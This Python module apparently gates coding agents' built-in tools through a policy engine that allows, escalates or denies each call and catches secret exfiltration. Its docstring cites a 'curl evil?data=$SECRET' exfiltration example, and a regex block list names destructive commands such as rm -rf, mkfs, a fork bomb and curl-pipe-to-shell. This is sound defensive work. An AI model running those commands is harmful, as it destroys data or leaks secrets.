"""Govern a coding agent's NATIVE tools (Claude Code / Cursor / Codex).

An MCP gateway only sees `tools/call` — it is blind to Claude Code's built-in
Edit / Write / Bash / Read, Cursor's editor + terminal, and Codex's shell. Those
are where the real risk lives (a `curl evil?data=$SECRET`, a force-push, an edit
outside the repo).

A client-side PreToolUse hook closes that gap: it POSTs each candidate native
tool call to ``/gate/evaluate`` here, we run KAIROS (authority + fidelity +
ceiling + attest) over a per-agent engine, and return allow / ask / deny. Every
call lands on the same mission-control feed + ledger as the MCP gateway, and the
same operator kill switch tightens it. ``/gate/observe`` (PostToolUse) feeds read
outputs into the taint tracker so a later egress carrying them is caught.

The engine reuses the coding-agent Domain Profile: read/edit/bookkeeping run
autonomously in scope, shell/web notify, destructive shell escalates, and a
sensitive value read that flows into a shell/web call is denied as exfiltration.
"""

from __future__ import annotations

import re
from typing import Any

from eidolon.api import live as live_svc
from eidolon.api.hosted import LocalReporter

# -- Claude Code / Cursor / Codex native tools -> governed policy ----------
# Keyed by the policy name we hand to the gate (also what shows in the feed).
_READ = "read-code"
_EDIT = "edit-code"
_RUN = "run-command"
_WEB = "web-egress"
_DESTRUCTIVE = "destructive-command"
_TASKS = "manage-tasks"

# tool name (as the client reports it) -> (policy tool id, action_class, sensitive, egress)
_TOOL_MAP: dict[str, tuple[str, str, bool, bool]] = {
    # reads (sensitive sources: their output may carry secrets to taint)
    "Read": ("Read", _READ, True, False),
    "Grep": ("Grep", _READ, False, False),
    "Glob": ("Glob", _READ, False, False),
    "LS": ("LS", _READ, False, False),
    "NotebookRead": ("NotebookRead", _READ, True, False),
    # edits (recoverable via git; autonomous in scope)
    "Edit": ("Edit", _EDIT, False, False),
    "Write": ("Write", _EDIT, False, False),
    "MultiEdit": ("MultiEdit", _EDIT, False, False),
    "NotebookEdit": ("NotebookEdit", _EDIT, False, False),
    # shell (egress: a command can carry data out)
    "Bash": ("Bash", _RUN, False, True),
    "BashOutput": ("BashOutput", _READ, False, False),
    "KillBash": ("KillBash", _RUN, False, False),
    # web (egress)
    "WebFetch": ("WebFetch", _WEB, False, True),
    "WebSearch": ("WebSearch", _WEB, False, True),
    # the agent's own bookkeeping
    "TodoWrite": ("TodoWrite", _TASKS, False, False),
    "Task": ("Task", _TASKS, False, False),
}

# Shell commands that are irreversible / dangerous -> destructive-command
# (escalates to a human). Matched against the Bash `command` string.
_DESTRUCTIVE_PATTERNS = [
    r"\brm\s+-[a-z]*[rf]", r"\brmdir\b", r"\bmkfs\b", r"\bdd\s+if=",
    r":\(\)\s*\{", r">\s*/dev/sd", r"\bshred\b",
    r"\bgit\s+push\b.*(--force|-f)\b", r"\bgit\s+reset\s+--hard\b",
    r"\bgit\s+clean\s+-[a-z]*f", r"\bcurl\b[^|]*\|\s*(sh|bash)", r"\bwget\b[^|]*\|\s*(sh|bash)",
    r"\bchmod\s+-R\s+777", r"\bshutdown\b", r"\breboot\b", r"\bkill\s+-9\s+-1\b",
    r"\bnpm\s+publish\b", r"\bdocker\s+system\s+prune\b",
    r"\bDROP\s+TABLE\b", r"\bTRUNCATE\b", r"\bDELETE\s+FROM\b",
]
_DESTRUCTIVE_RE = re.compile("|".join(_DESTRUCTIVE_PATTERNS), re.IGNORECASE)


def classify(tool_name: str, tool_input: dict | None) -> tuple[str, dict]:
    """Map a client tool call -> (policy tool id, arguments for the gate).

    Bash is split into run-command vs destructive-command by inspecting the
    command. Unknown tools fall through to a distinct id so the gate's default
    (fail-closed) class applies.
    """
    args = dict(tool_input or {})
    if tool_name == "Bash":
        cmd = str(args.get("command", ""))
        if _DESTRUCTIVE_RE.search(cmd):
            return "Bash(destructive)", args
        return "Bash", args
    mapped = _TOOL_MAP.get(tool_name)
    if mapped is None:
        return tool_name, args  # unknown -> gate default class (escalate)
    return mapped[0], args


def _tool_policies() -> list[dict]:
    scope = {"selectors": {"project": ["workspace"]}}
    pol = []
    for policy_id, action_class, sensitive, egress in _TOOL_MAP.values():
        entry: dict[str, Any] = {"tool": policy_id, "action_class": action_class, "scope": scope}
        if sensitive:
            entry["sensitive"] = True
        if egress:
            entry["egress"] = True
        pol.append(entry)
    # Bash split: the destructive variant is its own policy.
    pol.append({"tool": "Bash(destructive)", "action_class": _DESTRUCTIVE,
                "scope": scope, "egress": True})
    return pol


# Short, tool-echoing grounding memories. Fidelity strength is the SUM of
# relevance across recalled memories, so several short seeds that lexically match
# a tool's call query put routine dev work over the "strong evidence" bar (ACT).
# The hard controls stay elsewhere: ceilings (destructive escalates), exclusions
# (exfil denied), and authority (scope). Each is repeated so recall returns a
# cluster for its tool.
_SEEDS = [
    "call tool Read file_path to read code files routinely",
    "call tool Grep pattern to search code routinely",
    "call tool Glob pattern to find files routinely",
    "call tool LS path to list files routinely",
    "call tool Edit file_path old_string new_string to edit code routinely",
    "call tool Write file_path content to write code files routinely",
    "call tool MultiEdit file_path to edit code routinely",
    "call tool NotebookEdit file_path to edit notebooks routinely",
    "call tool Bash command to run builds tests lint and git routinely",
    "call tool WebFetch url to read documentation routinely",
    "call tool WebSearch query to search documentation routinely",
    "call tool TodoWrite todos to track tasks routinely",
]


def build_coding_engine(agent: dict, sf, hub):
    """A per-agent GovernanceEngine over the coding-agent profile + native tools."""
    from eidolon.api.accounts import PRESETS, split_preset
    from eidolon.common import crypto
    from eidolon.gateway.config import GatewayConfig, build_engine
    from eidolon.sage import InMemorySagePort

    _, authority = split_preset(agent["preset"])
    preset = PRESETS[authority]
    key = crypto.generate_keypair()
    cfg = GatewayConfig(
        profile_id="coding-agent",
        principal_signing_key=key.signing_key_hex,
        scope={"project": ["workspace"]},
        permitted_classes=[_READ, _EDIT, _RUN, _WEB, _DESTRUCTIVE, _TASKS],
        max_autonomy=preset["max_autonomy"],
        seed_memories=[s for s in _SEEDS for _ in range(6)],
        tool_policies=_tool_policies(),  # type: ignore[arg-type]
        default_class=_DESTRUCTIVE,  # unknown native tools fail closed (escalate)
        gateway_id=agent["id"], agent_name=agent["name"],
    )
    engine = build_engine(cfg, sage=InMemorySagePort())
    engine._reporter = LocalReporter(sf, hub, agent["id"], agent["name"])  # noqa: SLF001
    return engine


class CodingEngineCache:
    """Per-agent coding engines, built lazily and reused so taint + kill state
    persist across a session's tool calls."""

    def __init__(self, store, hub, max_agents: int = 500) -> None:
        self._store = store
        self._hub = hub
        self._max = max_agents
        self._engines: dict[str, Any] = {}

    def for_agent(self, agent: dict):
        eng = self._engines.get(agent["id"])
        if eng is None:
            if len(self._engines) >= self._max:
                self._engines.pop(next(iter(self._engines)), None)
            eng = build_coding_engine(agent, self._store(), self._hub)
            self._engines[agent["id"]] = eng
        return eng


def decision_for(result) -> str:
    """Map a GovernedResult to a PreToolUse permission decision."""
    if result.allowed:
        return "allow"
    level = (result.level or "").upper()
    msg = (result.message or "").lower()
    if level == "KILLED" or "killed by" in msg:
        return "deny"  # operator kill switch — hard stop
    if "ESCALATE" in level or "DRAFT" in level or "NOTIFY" in level:
        return "ask"   # hand it to the human (approval), don't hard-block
    return "deny"      # DENY / exclusion (e.g. data-exfiltration)


def event_snapshot(sf, gateway_id: str) -> dict:
    """A tiny recent-activity snapshot for the hook to echo (optional)."""
    try:
        evs = live_svc.recent_events(sf, limit=5)
        return {"recent": [e for e in evs if e.get("gateway_id") == gateway_id][:5]}
    except Exception:  # noqa: BLE001
        return {"recent": []}
